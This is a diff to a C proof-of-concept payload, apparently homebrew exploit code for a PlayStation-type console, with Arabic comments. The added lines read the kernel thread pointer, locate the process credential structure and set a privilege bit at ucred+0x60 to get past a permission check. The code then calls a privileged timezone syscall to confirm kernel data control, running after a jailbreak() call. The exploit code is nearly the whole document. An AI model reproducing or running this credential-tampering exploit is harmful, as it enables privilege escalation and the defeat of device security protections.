@@ -4,9 +4,27 @@
 #define SYS_UTC_TO_LOCALTIME  638
 
 void* poc_thread(void* arg) {
-
     printf_debug("=== timezone PoC ===\n");
 
+    // اقرأ thread pointer
+    uint64_t td;
+    __asm__ volatile ("mov %%gs:0, %0" : "=r"(td));
+    printf_debug("td = 0x%lx\n", td);
+
+    // اقرأ ucred
+    uint64_t ucred = *(uint64_t*)(td + 0x130);
+    printf_debug("ucred = 0x%lx\n", ucred);
+
+    // اقرأ القيمة الحالية
+    uint64_t val = *(uint64_t*)(ucred + 0x60);
+    printf_debug("ucred+0x60 = 0x%lx\n", val);
+
+    // FUN_ffffffff825b28e0 تفحص bit 62
+    // نضع bit 62 = 1
+    *(uint64_t*)(ucred + 0x60) = val | (1ULL << 62);
+    printf_debug("patched ucred+0x60\n");
+
+    // الآن استدعي الـ syscall
     static uint8_t data[512 * 16];
     memset(data, 0, sizeof(data));
 
@@ -36,7 +54,9 @@ void* poc_thread(void* arg) {
     printf_debug("set_timezone r=%d\n", r);
 
     if (r != 0) {
-        printf_debug("[-] failed errno=%d\n", r);
+        printf_debug("[-] still failed\n");
+        // أعد القيمة الأصلية
+        *(uint64_t*)(ucred + 0x60) = val;
         return NULL;
     }
 
@@ -60,10 +80,13 @@ void* poc_thread(void* arg) {
 
     long expected = 0x1000 + 0x41414141LL;
     if (result == expected) {
-        printf_debug("[+] CONFIRMED! data control works\n");
+        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
     } else {
         printf_debug("expected=0x%lx\n", expected);
     }
+
+    // أعد القيمة الأصلية
+    *(uint64_t*)(ucred + 0x60) = val;
 
     return NULL;
 }
@@ -71,7 +94,6 @@ void* poc_thread(void* arg) {
 int _main(struct thread *td) {
     UNUSED(td);
 
-    // init أولاً
     initKernel();
     initLibc();
     initPthread();
@@ -79,11 +101,9 @@ int _main(struct thread *td) {
     jailbreak();
     initSysUtil();
 
-    // شغّل PoC في thread جديد — بعيداً عن main thread
     ScePthread t;
     scePthreadCreate(&t, NULL, poc_thread, NULL, "poc");
 
-    // انتظر بـ busy wait بدون sleep
     int i = 0;
     while (i < 2000000000) i++;
 
